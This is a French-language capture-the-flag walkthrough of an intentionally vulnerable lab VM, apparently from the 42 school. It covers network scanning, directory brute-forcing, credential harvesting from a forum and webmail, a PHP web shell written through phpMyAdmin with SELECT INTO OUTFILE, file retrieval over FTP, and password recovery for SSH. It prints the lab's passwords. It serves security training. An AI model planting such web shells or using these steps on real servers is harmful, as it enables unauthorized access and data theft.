
---

### Identification de l'adresse IP

Après avoir configuré la connexion réseau de la VM en mode pont, nous avons utilisé la commande `ip a` pour récupérer notre adresse IP locale, qui est `192.168.108.190/25`.

Pour identifier l'adresse IP que la VM pourrait utiliser, nous avons exécuté deux scans Nmap avant et après le démarrage de la VM :

```bash
nmap 192.168.108.190/25 > files.txt  # Premier scan avant démarrage de la VM
nmap 192.168.108.190/25 > files2.txt # Deuxième scan après démarrage de la VM
```

Ensuite, nous avons comparé les résultats avec la commande `diff` :

```bash
diff files.txt files2.txt
```

Le résultat indiquait que l'adresse `192.168.108.150` était nouvelle dans le réseau :

```
> Host is up (0.00016s latency).
> 21/tcp open ftp
> 22/tcp open ssh
> 80/tcp open http
> 143/tcp open imap
> 443/tcp open https
> 993/tcp open imaps
```

### Vérification avec Curl

Nous avons utilisé Curl pour tester l'accessibilité de cette adresse :

```bash
curl https://192.168.108.150
```

Le résultat a confirmé la présence d'une page HTML avec des indices pertinents, notamment des références à "42" et "Hack me if you can", confirmant que nous étions sur la bonne piste.

### Utilisation de Dirb

Pour identifier les répertoires cachés sur le serveur, nous avons utilisé l'outil `Dirb` :

```bash
dirb https://192.168.108.150/ -r
```

Les résultats étaient prometteurs, révélant plusieurs répertoires intéressants tels que `/forum`, `/phpmyadmin`, et `/webmail`.

### Exploration des répertoires et récupération des identifiants

#### Forum
Après avoir exploré le répertoire `/forum`, nous avons accédé au profil de l'utilisateur "lmazard" où nous avons trouvé une adresse email importante.

#### Webmail
En nous connectant à `/webmail` avec les informations trouvées, nous avons accédé à la boîte mail qui contenait deux messages. L'un des messages contenait les identifiants pour se connecter à `/phpmyadmin`.

#### PhpMyAdmin
Les identifiants récupérés nous ont permis de nous connecter à la base de données via `/phpmyadmin` avec les détails suivants :

- **Username** : root
- **Mot de passe** : Fg-'kKXBj87E:aJ$


# Backdoor with injection SQL

On va injecter cette ligne de commande SQL, pour après pouvoir utiliser les commandes de shell, via le PHP.

```sql
SELECT "<?php system($_GET['cmd']) ?>" into outfile "/var/www/forum/templates_c/term.php"
```

L'injection se fait via le site de phpmyadmin, qu'on a récupéré les logins précedement, et sur la rubrique SQL. (TODO METTRE UN SCREEN OU METTRE LE SQL)

## Explications

```php
<?php system($_GET['cmd']) ?>
```

- `system()` : Permet de lancer des commandes sur le terminal, mais via le PHP
- `$_GET['cmd']` : Permet de récupérer la key `cmd`, dans l'url. Exemple: https://dns.com/index.php?cmd=ls%20/home et du coup `cmd=ls /home`

On peut remarquer avec `dirb -r https://<IP>/forum/` qu'on avais les liens suivants :

```
---- Scanning URL: https://192.168.1.194/forum/ ----
+ https://192.168.1.194/forum/backup (CODE:403|SIZE:294)
+ https://192.168.1.194/forum/config (CODE:403|SIZE:294)
==> DIRECTORY: https://192.168.1.194/forum/images/
==> DIRECTORY: https://192.168.1.194/forum/includes/
+ https://192.168.1.194/forum/index (CODE:200|SIZE:5355)
+ https://192.168.1.194/forum/index.php (CODE:200|SIZE:5355)
==> DIRECTORY: https://192.168.1.194/forum/js/
==> DIRECTORY: https://192.168.1.194/forum/lang/
==> DIRECTORY: https://192.168.1.194/forum/modules/
==> DIRECTORY: https://192.168.1.194/forum/templates_c/
==> DIRECTORY: https://192.168.1.194/forum/themes/
==> DIRECTORY: https://192.168.1.194/forum/update/
```

### Pourquoi a-t-on choisit le `/forum/templates_c` pour l'injection SQL et non les autres, qui contienne eux aussi des scripts?

La raison est que parce que dans le `templates_c`, on a le plus de droit d'accès que les autres et que les php sont excuté sans vérification en ammont qui n'est pas dans le code.

## Conclusion

En se baladant dans le system du host du forum, faisant des `ls` avec un path (ex: `ls /home`), on peut remarquer des dossier suspect comme `LOOKATME`, et du coup on peut remarquer un fichier `password`. Donc on excute la command `cat /home/LOOKATME/password` et on obtient, à l'url `https://<IP>/forum/templates_c/term.php?cmd=cat%20/home/LOOKATME/password` :

```
lmezard:G!@M6f4Eatau{sF"
```

Après plusieurs essaie d'endroit de connection, on a trouvé que c'était pour se connecter en FTP via la machine.

# Connection FTP et réception de fichier

La connection ftp se fait de manière simple en faisant seulement la commande suivante :

```
ftp <IP>
```

Puis, il faudra mettre le bon user, et le bon password trouver précèdement, en faisant un simple ls dans le ftp, on obtient celà:

```
ftp> ls
229 Entering Extended Passive Mode (|||15969|).
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.
```

Pour récupérer les fichiers, il faut tout simplement taper `recv <name_file>`. Apres les avoir récupérer, on voit un beau message dans le readme qui est le suivant :

```
Complete this little challenge and use the result as password for user 'laurie' to login in ssh
```

# Chercher le password SSH

Donc, on doit trouver un password pour la connection SSH ! Observant notre fichier `fun`. Quel est sont type de fichier? Oh, il y a une commande formidable pour ça `file`, donc on essaie `file fun`, on obtient un `fun: POSIX tar archive (GNU)`.

## Analyse et extraction des données de fun

Tout d'abord avant d'extraire ça sera pas mal de voir la liste des fichiers et les extraire, avec les commandes suivante :

```
tar -tvf fun > fun.list
tar -xvf fun
```

On remarque qu'on a 750 fichiers !!! Ouskour, mais grace à la liste, on a remarqué qu'il y en a un plus grand que les autres, on regarde, et on trouve un magnifique code en C. Et on remarque à chaque fin de fichier un commentaire en mode `//file750`, donc on remarque qu'il faut les triés et les combinés, pour cela faut un script.

### Script pour trier et créer le ficher .c

Voici le script ci dessous, il faudra juste changer le `<PATH_FT_FUN>` avec le path absolue du dossier extrait.

```py
import re
from pathlib import Path

def extract_order_from_file(filename):
    with open(filename, 'rb') as f:
        content = f.read()
    match = re.search(rb'//file(\d+)', content[-100:])
    if match:
        return int(match.group(1))
    return None

def combine_pcap_files(directory, output_filename):

    pcap_files = list(Path(directory).glob('*.pcap'))

    ordered_files = []
    for pcap_file in pcap_files:
        order = extract_order_from_file(pcap_file)
        if not order:
            continue
        ordered_files.append((order, pcap_file))

    ordered_files.sort(key=lambda x: x[0])

    with open(output_filename, 'wb') as output_file:
        for _, pcap_file in ordered_files:
            with open(pcap_file, 'rb') as f:
                content = f.read()
                content = re.sub(rb'//file\d+', b'', content)
                output_file.write(content)

    print(f"Combined {len(ordered_files)} files into {output_filename}")

combine_pcap_files('<PATH_FT_FUN>', 'fun.c')
```

Puis on compile le fichier `fun.c`.

```sh
cc fun.c -o fun.out
```

Puis, on execute le `fun.out`, on obtient ça :

```
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit
```

Donc il faut hasher le mot de passe `Iheartpwnage` en SHA-256, sur https://www.sha256.fr/, ce qui donne:

```
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

## Conclusion

Donc, on peut enfin se connecter en ssh en user laurie, voici la commande :

```sh
ssh laurie@<IP>
```

Et donc le mot de passe est :

```
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```


---
